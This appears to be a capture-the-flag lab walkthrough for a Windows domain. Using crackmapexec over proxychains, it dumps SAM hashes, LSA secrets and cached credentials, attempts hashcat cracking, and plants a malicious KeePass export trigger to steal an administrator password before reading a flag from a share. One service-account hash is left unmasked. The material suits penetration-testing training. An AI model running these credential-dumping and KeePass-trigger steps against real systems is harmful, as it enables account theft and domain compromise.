1. Read the flag from the shared folder Ccache.

> `Cached Credentials` are the credentials (cached domain records) stored inside the LSA when a user logs into a workstation or server.

```sh
# Shares
sudo proxychains -q crackmapexec smb dc01.inlanefreight.htb -u XXXXXX$ -H XXXXXX --shares

SMB         172.16.15.3     445    DC01             [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache                          Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# But we have no read permissions. So, there must be someone else with the creds. Has anyone else logged into the machine?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX --sessions

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
SMB         172.16.15.20    445    DEV01            [*] Enumerated sessions
DEV01            \\172.16.15.15            User:XXXXXX$
DEV01            \\172.16.15.15            User:XXXXXX$


# LAPS passwords
udo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX$ -H XXXXXX --laps

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.15.3     389    DC01             [-] msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for DC01


# Dump SAM
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX --sam

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
*] Dumping SAM hashes
SMB         172.16.15.20    445    DEV01            Administrator:500:XXXXXX
SMB         172.16.15.20    445    DEV01            [+] Added 4 SAM hashes to the database


# Dump LSA Secrets/Cached Credentials
 sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX --lsa
 
SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\svc_devadm$:89f0a550e0f734fbf1d289e94691aaa4 (Pwn3d!)
SMB         172.16.15.20    445    DEV01            [+] Dumping LSA secrets
SMB         172.16.15.20    445    DEV01            INLANEFREIGHT.LOCAL/Administrator:$XXXXXX
SMB         172.16.15.20    445    DEV01            [+] Dumped 8 LSA secrets to /root/.nxc/logs/DEV01_172.16.15.20_2026-02-28_180033.secrets and /root/.nxc/logs/DEV01_172.16.15.20_2026-02-28_180033.cached


# Read the cached
cat /root/.nxc/logs/DEV01_172.16.15.20_2026-02-28_180033.cached

INLANEFREIGHT.LOCAL/Administrator:$XXXXXX: (2022-12-14 22:19:41+00:00)


# Read the secrets
cat /root/.nxc/logs/DEV01_172.16.15.20_2026-02-28_180033.secrets

INLANEFREIGHT\DEV01$:aes256-cts-hmac-sha1-96:XXXXXX
...


# Can we crack the admin password?
cat /root/.nxc/logs/DEV01_172.16.15.20_2026-02-28_180033.cached | cut -d ":" -f 2 > admin_hash

cat admin_hash 

$DCC2$10240#Administrator#XXXXXX

# Crack
hashcat -m 2100 admin_hash /usr/share/wordlists/rockyou.txt -O


# No chance. What would it have done even? Looking through the module's notes, search for keepass
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX -M keepass_discover

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
KEEPASS_... 172.16.15.20    445    DEV01            [*] No KeePass-related process was found
KEEPASS_... 172.16.15.20    445    DEV01            Found C:\Users\Administrator\AppData\Roaming\KeePass\KeePass.config.xml
C:\Users\Administrator\Application Data\KeePass\KeePass.config.xml
C:\Users\Administrator\Desktop\XXXXXX.kdbx


# Can we read that thing? Make sure to change back slashes to forward slashes for the config file
sudo proxychains -q crackmapexec smb 172.16.15.20 -u XXXXXX$ -H XXXXXX -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml 


[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [+] INLANEFREIGHT.LOCAL\XXXXXX$:XXXXXX (Pwn3d!)
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Adding trigger 'export_database' to 'C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml'
KEEPASS_... 172.16.15.20    445    DEV01            [+] Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [-] No running KeePass process found, aborting restart
KEEPASS_... 172.16.15.20    445    DEV01            [*] Polling for database export every 5 seconds, please be patient
KEEPASS_... 172.16.15.20    445    DEV01            [*] we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything
.....
KEEPASS_... 172.16.15.20    445    DEV01            [+] Found database export !
KEEPASS_... 172.16.15.20    445    DEV01            [+] Moved remote "C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Cleaning everything...
KEEPASS_... 172.16.15.20    445    DEV01            [*] No export found in C:\Users\Public , everything is cleaned
KEEPASS_... 172.16.15.20    445    DEV01            [*] Found trigger 'export_database' in configuration file, removing
KEEPASS_... 172.16.15.20    445    DEV01            [-] No running KeePass process found, aborting restart
KEEPASS_... 172.16.15.20    445    DEV01            
KEEPASS_... 172.16.15.20    445    DEV01            [*] Extracting password...
[18:41:32] ERROR    Exception while calling proto_flow() on target 172.16.15.20: string indices must be integers, not 'str' 
...
TypeError: string indices must be integers, not 'str'


# Is there a password anyways?
cat /tmp/export.xml | grep -i protectinmemory -A 5

	<Value ProtectInMemory="True">XXXXXX</Value>
</String>
<String>
	<Key>Title</Key>
	<Value>Admin XXXXXX</Value>
</String>


# or read the file
cat /tmp/export.xml

...
<String>
	<Key>Notes</Key>
	<Value></Value>
</String>
<String>
	<Key>Password</Key>
	<Value ProtectInMemory="True">XXXXXX</Value>
</String>
<String>
	<Key>Title</Key>
	<Value>Admin XXXXXX</Value>
</String>
<String>
	<Key>URL</Key>
	<Value></Value>
</String>
<String>
	<Key>UserName</Key>
	<Value>XXXXXX</Value>
</String>
...


# Validate the user
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --shares

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Ccache          READ,WRITE      Ccache Files for Users
CertEnroll      READ            Active Directory Certificate Services share
DEV                             Development Share
DEV_INTERN                      Development Share for Interns
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 


# Yaaaaay!!!! Find the flag
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX' --spider Ccache -pattern txt

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
SMB         172.16.15.3     445    DC01             [*] Started spidering
SMB         172.16.15.3     445    DC01             [*] Spidering .
SMB         172.16.15.3     445    DC01             //172.16.15.3/Ccache/flag.txt [lastm:'2022-12-15 13:56' size:27]
SMB         172.16.15.3     445    DC01             [*] Done spidering (Completed in 0.0671389102935791)


# Download the flag
sudo proxychains -q crackmapexec smb 172.16.15.3 -u XXXXXX -p 'XXXXXX'  --share Ccache --get-file flag.txt flag.txt


SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\XXXXXX:XXXXXX 
SMB         172.16.15.3     445    DC01             [*] Copying "flag.txt" to "flag.txt"
SMB         172.16.15.3     445    DC01             [+] File "flag.txt" was downloaded to "flag.txt"


# Read
cat flag.txt 

XXXXXX
```
